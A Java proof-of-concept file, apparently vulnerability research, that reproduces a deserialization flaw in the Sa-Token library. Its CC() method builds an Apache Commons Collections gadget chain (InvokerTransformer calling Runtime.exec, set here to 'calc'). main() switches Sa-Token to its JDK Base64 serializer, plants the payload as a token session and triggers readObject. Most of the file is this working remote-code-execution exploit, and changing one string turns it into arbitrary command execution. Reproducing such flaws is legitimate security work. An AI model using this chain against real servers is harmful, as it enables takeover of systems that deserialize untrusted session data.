package deserialize;

import cn.dev33.satoken.SaManager;
import cn.dev33.satoken.config.SaTokenConfig;
import cn.dev33.satoken.context.SaHolder;
import cn.dev33.satoken.context.mock.SaRequestForMock;
import cn.dev33.satoken.context.mock.SaTokenContextMockUtil;
import cn.dev33.satoken.dao.SaTokenDao;
import cn.dev33.satoken.dao.auto.SaTokenDaoByObjectFollowString;
import cn.dev33.satoken.serializer.impl.SaSerializerTemplateForJdkUseBase64;
import cn.dev33.satoken.session.SaSession;
import cn.dev33.satoken.stp.StpLogic;
import cn.dev33.satoken.stp.StpUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.*;

public class Main {

    public Main() throws IOException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException {
    }

    // 构造恶意序列化数据，执行 calc.exe
    public static String CC() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer instance = ChainedTransformer.getInstance(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map,new ConstantTransformer("balabala"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "666");
        HashMap<Object,Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry,"bbb");
        lazyMap.remove("666");


        Class c = Class.forName("org.apache.commons.collections.map.LazyMap");
        Field factory = c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,instance);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(map2);
        oos.close();

        return Base64.getEncoder().encodeToString(bos.toByteArray());

    }


    public static void main(String[] args) {
        // 1) 配置只从 Cookie 读取 token，便于验证
        SaTokenConfig cfg = SaManager.getConfig();
        cfg.setIsReadCookie(true);
        cfg.setIsReadHeader(false);
        cfg.setIsReadBody(false);
        cfg.setTokenName("satoken");
        cfg.setTokenPrefix(null); // 不使用前缀，避免额外格式要求

        // 2) 切换序列化器为 JDK(Base64)，使 stringToObject() 走 ObjectInputStream.readObject()
        SaManager.setSaSerializerTemplate(new SaSerializerTemplateForJdkUseBase64());

        // 3) 注入一个内存型的 String 存储 DAO（Object 读写跟随 String 读写）
        InMemoryStringDao dao = new InMemoryStringDao();
        SaManager.setSaTokenDao(dao);

        // 4) 使用 Mock 上下文模拟一次带 Cookie 的请求，并预置一个经过 JDK 反序列化可读的载荷
        SaTokenContextMockUtil.setMockContext(() -> {
            SaRequestForMock req = (SaRequestForMock) SaHolder.getRequest();

            String cookieToken = "test";
            req.cookieMap.put(cfg.getTokenName(), cookieToken);

            // 计算此 token 对应的 Token-Session 键
            StpLogic logic = StpUtil.stpLogic;
            String sessionKey = logic.splicingKeyTokenSession(cookieToken);
            try {
                dao.set(sessionKey, CC(), 600);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }

            try {
                SaSession got = StpUtil.getTokenSession();
                System.out.println(got.getId());
            } catch (Throwable ex) {
                System.out.println(ex.getClass().getName() + ": " + ex.getMessage());
            }
        });
    }


    static class InMemoryStringDao implements SaTokenDaoByObjectFollowString, SaTokenDao {
        private final Map<String, String> data = new LinkedHashMap<>();
        private final Map<String, Long> expire = new LinkedHashMap<>();

        @Override
        public synchronized String get(String key) {
            clearIfExpired(key);
            return data.get(key);
        }

        @Override
        public synchronized void set(String key, String value, long timeout) {
            if (timeout == 0 || timeout <= SaTokenDao.NOT_VALUE_EXPIRE) return;
            data.put(key, value);
            expire.put(key, timeout == SaTokenDao.NEVER_EXPIRE ? SaTokenDao.NEVER_EXPIRE : System.currentTimeMillis() + timeout * 1000);
        }

        @Override
        public synchronized void update(String key, String value) {
            if (getTimeout(key) == SaTokenDao.NOT_VALUE_EXPIRE) return;
            data.put(key, value);
        }

        @Override
        public synchronized void delete(String key) {
            data.remove(key);
            expire.remove(key);
        }

        @Override
        public synchronized long getTimeout(String key) {
            clearIfExpired(key);
            Long e = expire.get(key);
            if (e == null) return SaTokenDao.NOT_VALUE_EXPIRE;
            if (e == SaTokenDao.NEVER_EXPIRE) return SaTokenDao.NEVER_EXPIRE;
            long ttl = (e - System.currentTimeMillis()) / 1000;
            if (ttl < 0) {
                data.remove(key);
                expire.remove(key);
                return SaTokenDao.NOT_VALUE_EXPIRE;
            }
            return ttl;
        }

        @Override
        public synchronized void updateTimeout(String key, long timeout) {
            expire.put(key, timeout == SaTokenDao.NEVER_EXPIRE ? SaTokenDao.NEVER_EXPIRE : System.currentTimeMillis() + timeout * 1000);
        }

        @Override
        public synchronized java.util.List<String> searchData(String prefix, String keyword, int start, int size, boolean sortType) {
            List<String> keys = new ArrayList<>();
            for (String k : data.keySet()) {
                if (k.startsWith(prefix) && (keyword == null || k.contains(keyword))) {
                    keys.add(k);
                }
            }
            if (!sortType) Collections.reverse(keys);
            if (size == -1) size = keys.size();
            int end = Math.min(start + size, keys.size());
            if (start >= end) return Collections.emptyList();
            return keys.subList(start, end);
        }

        private void clearIfExpired(String key) {
            Long e = expire.get(key);
            if (e != null && e != SaTokenDao.NEVER_EXPIRE && e < System.currentTimeMillis()) {
                data.remove(key);
                expire.remove(key);
            }
        }
    }
}

